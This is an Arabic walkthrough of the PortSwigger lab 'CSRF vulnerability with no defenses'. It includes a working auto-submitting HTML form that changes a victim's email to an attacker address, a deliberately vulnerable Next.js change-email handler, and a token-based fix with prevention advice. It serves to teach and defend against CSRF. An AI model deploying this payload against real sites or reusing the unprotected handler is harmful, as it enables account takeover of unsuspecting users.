# Lab: CSRF vulnerability with no defenses

> **Category:** CSRF  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. سنقوم بإنشاء صفحة HTML خبيثة تغير بريد الضحية عند زيارتها، ثم نرفعها إلى Exploit Server.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم الطلب

- ادخل إلى المختبر
- سجل الدخول بـ: `wiener:peter`
- اذهب إلى **My account**
- غير بريدك الإلكتروني إلى أي قيمة
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION-COOKIE

email=wiener%40normal-user.net
```

### الخطوة 2: إنشاء HTML للهجوم

استخدم هذا القالب:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hacked%40attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

> **ملاحظة:** استبدل `YOUR-LAB-ID` بمعرف مختبرك الحقيقي.

### الخطوة 3: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server** في المختبر
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 4: تجربة الهجوم على نفسك

- اضغط **View exploit**
- ارجع إلى حسابك وتأكد من أن بريدك الإلكتروني **تغير** إلى `hacked@attacker.net`

### الخطوة 5: تسليم الهجوم للضحية

- غير البريد الإلكتروني في الـ HTML إلى قيمة مختلفة عن بريدك (مثل `victim@hacked.net`)
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 6: حل المختبر

بمجرد تسليم الهجوم، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي CSRF؟** | هجوم يجبر المستخدم على تنفيذ طلب غير مرغوب فيه بدون علمه |
| **لماذا نجح هذا؟** | الموقع لا يستخدم أي توكنات CSRF ولا يتحقق من Referer/Origin |
| **كيف يعمل الهجوم؟** | الضحية يزور الصفحة، فيتم إرسال الطلب تلقائياً باستخدام كوكي الجلسة المخزن |
| **الفرق عن XSS؟** | XSS ينفذ كود في الموقع، أما CSRF فينفذ طلبات باسم المستخدم |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الموقع لا يستخدم أي آلية حماية مثل CSRF Tokens، ولا يتحقق من Referer أو Origin.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/change-email.js
export default function handler(req, res) {
  const { email } = req.body;
  const { sessionId } = req.cookies;
  
  // خطأ: لا يوجد أي تحقق من مصدر الطلب
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/change-email.js
import { generateCsrfToken, verifyCsrfToken } from './csrf';

export default function handler(req, res) {
  const { email, csrfToken } = req.body;
  const { sessionId } = req.cookies;
  
  // التصحيح: التحقق من وجود CSRF Token صحيح
  if (!verifyCsrfToken(sessionId, csrfToken)) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**مع إضافة التوكن في الـ Form:**

```jsx
// components/ChangeEmailForm.jsx
import { generateCsrfToken } from './csrf';

export default function ChangeEmailForm({ sessionId }) {
  const csrfToken = generateCsrfToken(sessionId);
  
  return (
    <form method="POST" action="/api/change-email">
      <input type="hidden" name="csrfToken" value={csrfToken} />
      <input type="email" name="email" />
      <button type="submit">Update</button>
    </form>
  );
}
```

**الخلاصة:** استخدم CSRF Tokens فريدة لكل جلسة، وتحقق منها في كل طلب يغير حالة المستخدم.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام CSRF Tokens:** توكن عشوائي مرتبط بجلسة المستخدم.
2. **التحقق من Referer/Origin:** تأكد أن الطلب يأتي من نفس الموقع.
3. **استخدام SameSite Cookies:** اضبط الكوكي بـ `SameSite=Lax` أو `SameSite=Strict`.
4. **استخدام Custom Headers:** مثل `X-Requested-By` وتحققه في الخادم.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-no-defenses)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
